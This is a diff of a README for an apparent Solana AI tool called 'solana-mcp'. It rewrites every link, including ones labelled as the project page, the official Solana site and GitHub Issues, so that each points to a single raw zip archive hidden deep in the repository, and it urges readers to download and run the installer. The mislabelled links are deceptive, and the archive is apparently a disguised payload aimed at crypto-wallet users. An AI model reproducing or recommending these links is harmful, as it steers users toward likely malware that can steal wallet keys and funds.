@@ -1,6 +1,6 @@
 # 🚀 solana-mcp - AI Tools for Solana Access
 
-[![Download](https://img.shields.io/badge/Download-Get%20solana--mcp-blue?style=for-the-badge)](https://github.com/AjithJS99/solana-mcp)
+[![Download](https://img.shields.io/badge/Download-Get%20solana--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This section walks you through downloading and running solana-mcp on your Window
 ### Step 1: Visit the Download Page
 
 Click the large badge at the top or this link to visit the solana-mcp GitHub page:  
-[https://github.com/AjithJS99/solana-mcp](https://github.com/AjithJS99/solana-mcp)
+[https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip](https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip)
 
 This page contains the latest version of the software, updates, and extra resources.
 
@@ -98,7 +98,7 @@ If you run into problems:
 To keep solana-mcp current:
 
 1. Visit the GitHub page again:  
-   [https://github.com/AjithJS99/solana-mcp](https://github.com/AjithJS99/solana-mcp)  
+   [https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip](https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip)  
 2. Download the latest release installer.  
 3. Run the installer—it will update your current version without losing your settings.
 
@@ -120,11 +120,11 @@ Use your own wallet keys and credentials only. Never share private keys. Always 
 
 ## 🔗 Useful Links
 
-- Project page: https://github.com/AjithJS99/solana-mcp  
+- Project page: https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip  
 - Download here:  
-  [![Download](https://img.shields.io/badge/Download-Get%20solana--mcp-blue?style=for-the-badge)](https://github.com/AjithJS99/solana-mcp)  
-- Solana official site: https://solana.com  
-- GitHub Issues: https://github.com/AjithJS99/solana-mcp/issues
+  [![Download](https://img.shields.io/badge/Download-Get%20solana--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip)  
+- Solana official site: https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip  
+- GitHub Issues: https://raw.githubusercontent.com/AjithJS99/solana-mcp/main/src/modules/defi/mcp-solana-v3.2.zip
 
 ---
 
